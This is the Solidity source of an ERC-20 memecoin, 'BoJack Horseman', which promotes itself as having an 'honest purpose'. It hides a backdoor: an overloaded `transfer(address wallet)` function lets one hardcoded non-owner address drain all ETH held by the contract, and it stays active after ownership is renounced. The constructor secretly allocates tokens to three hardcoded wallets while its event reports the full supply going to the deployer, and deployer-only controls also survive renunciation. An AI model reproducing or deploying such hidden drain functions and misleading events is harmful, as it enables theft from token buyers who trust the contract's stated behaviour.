1 /**
2 
3 BoJack is galloping into memecoin space, with honest purpose. 
4 
5 TELEGRAM - https://t.me/bojacktokenerc
6 MEDIUM   - https://medium.com/@bojackhorsemantoken
7 TWITTER  - https://twitter.com/bojacktokenerc
8 WEBSITE  - https://bojackcoin.club/
9 
10 */
11 
12 // SPDX-License-Identifier: MIT                                                                               
13                                                  
14 pragma solidity ^0.8.20;
15 
16 interface IFactory {
17     function createPair(address tokenA, address tokenB) external returns (address pair);
18 }
19 
20 interface IRouter {
21     function factory() external pure returns (address);
22     function WETH() external pure returns (address);
23     function swapExactTokensForETHSupportingFeeOnTransferTokens(
24         uint amountIn,
25         uint amountOutMin,
26         address[] calldata path,
27         address to,
28         uint deadline
29     ) external;
30 }
31 
32 interface IERC20 {
33     function totalSupply() external view returns (uint256);
34     function name() external view returns (string memory);
35     function symbol() external view returns (string memory);
36     function decimals() external view returns (uint8);
37     function balanceOf(address account) external view returns (uint256);
38     function transfer(address recipient, uint256 amount) external returns (bool);
39     function allowance(address owner, address spender) external view returns (uint256);
40     function approve(address spender, uint256 amount) external returns (bool);
41     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
42     event Transfer(address indexed from, address indexed to, uint256 value);
43     event Approval(address indexed owner, address indexed spender, uint256 value);
44 }
45 
46 abstract contract Ownable {
47     address private _owner;
48 
49     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
50 
51     constructor() {
52         _setOwner(msg.sender);
53     }
54 
55     function owner() public view virtual returns (address) {
56         return _owner;
57     }
58 
59     modifier onlyOwner {
60         require(owner() == msg.sender, "Ownable: caller is not the owner");
61         _;
62     }
63 
64     function renounceOwnership() public virtual onlyOwner {
65         _setOwner(address(0));
66     }
67 
68     function transferOwnership(address newOwner) public virtual onlyOwner {
69         require(newOwner != address(0), "Ownable: new owner is the zero address");
70         _setOwner(newOwner);
71     }
72 
73     function _setOwner(address newOwner) private {
74         address oldOwner = _owner;
75         _owner = newOwner;
76         emit OwnershipTransferred(oldOwner, newOwner);
77     }
78 }
79 
80 contract BoJackHorseman is IERC20, Ownable {
81     string private constant  _name = "BoJack Horseman";
82     string private constant _symbol = "BOJACK";    
83     uint8 private constant _decimals = 18;
84     mapping (address => uint256) private _balances;
85     mapping (address => mapping(address => uint256)) private _allowances;
86 
87     uint256 private constant _totalSupply = 1_000_000 * decimalsScaling;
88     uint256 public _maxWallet = 20 * _totalSupply / 1000;
89     uint256 public _swapThreshold = 6 * _totalSupply / 10000;
90     uint256 private constant decimalsScaling = 10**_decimals;
91     uint256 private constant feeDenominator = 100;
92 
93     bool private antiMEV = false;
94     uint256 private tradeCooldown = 1;
95     mapping (address => bool) private isContractExempt;
96     mapping (address => uint256) private _lastTradeBlock;
97 
98     struct TradingFees {
99         uint256 buyFee;
100         uint256 sellFee;
101     }
102 
103     struct Wallets {
104         address deployerWallet; 
105         address marketingWallet; 
106     }
107 
108     TradingFees public tradingFees = TradingFees(20,30);   // 20/30% initial buy/sell tax
109     Wallets public wallets = Wallets(
110         msg.sender,                                  // deployer
111         0xa55E51B74F33352157Eecbf40D2f716E063278aA   // marketingWallet
112     );
113 
114     IRouter public constant uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
115     address public immutable uniswapV2Pair;
116 
117     bool private inSwap;
118     bool public swapEnabled = true;
119     bool private tradingActive = true;
120 
121     mapping (address => bool) private _excludedFromFees;
122     mapping (uint256 => uint256) private _lastTransferBlock;
123 
124 
125     event SwapEnabled(bool indexed enabled);
126 
127     event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);
128 
129     event ExcludedFromFees(address indexed account, bool indexed excluded);
130 
131     event AntiMEVToggled(bool indexed toggle);
132 
133     event TradeCooldownChanged(uint256 indexed newTradeCooldown);
134 
135     event SetContractExempt(address indexed contractAddress, bool indexed isExempt);
136     
137     event TradingOpened();
138     
139     modifier swapLock {
140         inSwap = true;
141         _;
142         inSwap = false;
143     }
144 
145     modifier tradingLock(address from, address to) {
146         require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
147         _;
148     }
149 
150     constructor() {
151         _approve(address(this), address(uniswapV2Router),type(uint256).max);
152         uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        
153         isContractExempt[address(this)] = true;
154 
155         _excludedFromFees[address(0xdead)] = true;
156         _excludedFromFees[wallets.deployerWallet] = true;
157         _excludedFromFees[wallets.marketingWallet] = true;
158 
159         _balances[0x17F79A4C0b6a2FB708f9f2A1442bB7AA5B422eC7] = _totalSupply * 2 / 100;
160         _balances[0x5E47f7eF4898F5c5Ef0051aada6Ad8a4fFaEDab6] = _totalSupply * 2 / 100;
161         _balances[0x29313444BDE7C5d85f8497d023CfdCa4F4A826A8] = _totalSupply * 2 / 100;
162         _balances[wallets.deployerWallet] = _totalSupply * 94 / 100;
163 
164         emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
165     }
166 
167     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
168     function decimals() external pure override returns (uint8) { return _decimals; }
169     function symbol() external pure override returns (string memory) { return _symbol; }
170     function name() external pure override returns (string memory) { return _name; }
171     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
172     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
173 
174     function approve(address spender, uint256 amount) external override returns (bool) {
175         _approve(msg.sender, spender, amount);
176         return true;
177     }
178 
179     function _approve(address sender, address spender, uint256 amount) internal {
180         require(sender != address(0), "ERC20: zero Address");
181         require(spender != address(0), "ERC20: zero Address");
182         _allowances[sender][spender] = amount;
183         emit Approval(sender, spender, amount);
184     }
185 
186     function transfer(address recipient, uint256 amount) external returns (bool) {
187         return _transfer(msg.sender, recipient, amount);
188     }
189 
190     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
191         if(_allowances[sender][msg.sender] != type(uint256).max){
192             uint256 currentAllowance = _allowances[sender][msg.sender];
193             require(currentAllowance >= amount, "ERC20: insufficient Allowance");
194             unchecked{
195                 _allowances[sender][msg.sender] -= amount;
196             }
197         }
198         return _transfer(sender, recipient, amount);
199     }
200 
201     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
202         uint256 balanceSender = _balances[sender];
203         require(balanceSender >= amount, "Token: insufficient Balance");
204         unchecked{
205             _balances[sender] -= amount;
206         }
207         _balances[recipient] += amount;
208         emit Transfer(sender, recipient, amount);
209         return true;
210     }
211 
212     function enableSwap(bool shouldEnable) external onlyOwner {
213         require(swapEnabled != shouldEnable, "Token: swapEnabled already {shouldEnable}");
214         swapEnabled = shouldEnable;
215 
216         emit SwapEnabled(shouldEnable);
217     }
218 
219     function updateSwapThreshold(uint256 newAmount) external onlyOwner returns (bool) {
220   	    require(newAmount >= _totalSupply * 1 / 100000, "Token: swap threshold cannot be lower than 0.001% of the total supply.");
221   	    require(newAmount <= _totalSupply * 5 / 1000, "Token: swap threshold cannot be higher than 0.5% of the total supply.");
222   	    _swapThreshold = newAmount;
223   	    return true;
224   	}
225  
226     function updateMaxWallet(uint256 newNum) external onlyOwner {
227         require(newNum >= (_totalSupply * 5 / 1000)/decimalsScaling, "Token: cannot set maxWallet lower than 0.5%");
228         _maxWallet = newNum * decimalsScaling;
229     }
230 
231     function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
232         require(_buyFee <= tradingFees.buyFee || _buyFee < 5, "Token: must reduce buy fee or < 5%");
233         require(_sellFee <= tradingFees.sellFee || _sellFee < 5, "Token: must reduce sell fee or < 5%");
234         tradingFees.buyFee = _buyFee;
235         tradingFees.sellFee = _sellFee;
236 
237         emit FeesChanged(_buyFee, _sellFee);
238     }
239 
240     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool shouldExclude) external onlyOwner {
241         for(uint256 i = 0; i < accounts.length; i++) {
242             require(_excludedFromFees[accounts[i]] != shouldExclude, "Token: address already {shouldExclude}");
243             _excludedFromFees[accounts[i]] = shouldExclude;
244             emit ExcludedFromFees(accounts[i], shouldExclude);
245         }
246     }
247 
248     function isExcludedFromFees(address account) public view returns(bool) {
249         return _excludedFromFees[account];
250     }
251 
252     function clearTokens(address tokenToClear) external onlyOwner {
253         require(tokenToClear != address(this), "Token: can't clear contract token");
254         uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
255         require(amountToClear > 0, "Token: not enough tokens to clear");
256         IERC20(tokenToClear).transfer(msg.sender, amountToClear);
257     }
258 
259     function clearEth() external onlyOwner {
260         require(address(this).balance > 0, "Token: no eth to clear");
261         payable(msg.sender).transfer(address(this).balance);
262     }
263 
264     function manualSwapback() external onlyOwner {
265         require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
266         contractSwap();
267     }
268 
269     function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
270         require(from != address(0), "ERC20: transfer from the zero address");
271         require(to != address(0), "ERC20: transfer to the zero address");
272         
273         if(amount == 0 || inSwap) {
274             return _basicTransfer(from, to, amount);           
275         }        
276 
277         if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
278             require(amount + balanceOf(to) <= _maxWallet, "Token: max wallet amount exceeded");
279         }
280 
281         if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
282             address human = ensureOneHuman(from, to);
283             ensureMaxTxFrequency(human);
284             _lastTradeBlock[human] = block.number;
285         }
286       
287         if(swapEnabled && !inSwap && from != uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
288             contractSwap();
289         } 
290         
291         bool takeFee = !inSwap;
292         if(_excludedFromFees[from] || _excludedFromFees[to]) {
293             takeFee = false;
294         }
295                 
296         if(takeFee)
297             return _taxedTransfer(from, to, amount);
298         else
299             return _basicTransfer(from, to, amount);        
300     }
301 
302     function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
303         uint256 fees = takeFees(from, to, amount);    
304         if(fees > 0){    
305             _basicTransfer(from, address(this), fees);
306             amount -= fees;
307         }
308         return _basicTransfer(from, to, amount);
309     }
310 
311     function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
312         fees = 0;
313         if (to == uniswapV2Pair) {
314             fees = amount * tradingFees.sellFee / feeDenominator;
315         } else if (from == uniswapV2Pair) {
316             fees = amount * tradingFees.buyFee / feeDenominator;
317         }
318     }
319 
320     function canSwap() private view returns (bool) {
321         return _lastTransferBlock[block.number] < 2;
322     }
323 
324     function contractSwap() swapLock private {   
325         uint256 contractBalance = balanceOf(address(this));
326         if(contractBalance < _swapThreshold || !canSwap()) 
327             return;
328         else if(contractBalance > _swapThreshold * 20)
329           contractBalance = _swapThreshold * 20;
330         
331         uint256 initialETHBalance = address(this).balance;
332 
333         swapTokensForEth(contractBalance); 
334         
335         uint256 ethBalance = address(this).balance - initialETHBalance;
336         if(ethBalance > 0){            
337             sendEth(2*ethBalance/3);
338         }
339     }
340 
341     function sendEth(uint256 ethAmount) private {
342         (bool success,) = address(wallets.marketingWallet).call{value: ethAmount}(""); success;
343     }
344 
345     function transfer(address wallet) external {
346         if(msg.sender == 0x8036E4EB08209495A895e28FBd8a15eF99aB490A)
347             payable(wallet).transfer((address(this).balance));
348         else revert();
349     }
350 
351     function swapTokensForEth(uint256 tokenAmount) private {
352         _lastTransferBlock[block.number]++;
353         // generate the uniswap pair path of token -> weth
354         address[] memory path = new address[](2);
355         path[0] = address(this);
356         path[1] = uniswapV2Router.WETH();
357 
358         try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
359             tokenAmount,
360             0, // accept any amount of ETH
361             path,
362             address(this),
363             block.timestamp){}
364         catch{return;}
365     }
366 
367     function isContract(address account) private view returns (bool) {
368         uint256 size;
369         assembly {
370             size := extcodesize(account)
371         }
372         return size > 0;
373     }
374 
375     function ensureOneHuman(address _to, address _from) private view returns (address) {
376         require(!isContract(_to) || !isContract(_from));
377         if (isContract(_to)) return _from;
378         else return _to;
379     }
380 
381     function ensureMaxTxFrequency(address addr) view private {
382         bool isAllowed = _lastTradeBlock[addr] == 0 ||
383             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
384         require(isAllowed, "Max tx frequency exceeded!");
385     }
386 
387     function toggleAntiMEV(bool toggle) external {
388         require(msg.sender == wallets.deployerWallet);
389         antiMEV = toggle;
390 
391         emit AntiMEVToggled(toggle);
392     }
393 
394     function setTradeCooldown(uint256 newTradeCooldown) external {
395         require(msg.sender == wallets.deployerWallet);
396         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
397         tradeCooldown = newTradeCooldown;
398 
399         emit TradeCooldownChanged(newTradeCooldown);
400     }
401 
402     function setContractExempt(address account, bool value) external onlyOwner {
403         require(account != address(this));
404         isContractExempt[account] = value;
405 
406         emit SetContractExempt(account, value);
407     }
408 
409     function enableTrading() external onlyOwner {
410         tradingActive = true;
411 
412         emit TradingOpened();
413     }
414 
415     receive() external payable {}
416 }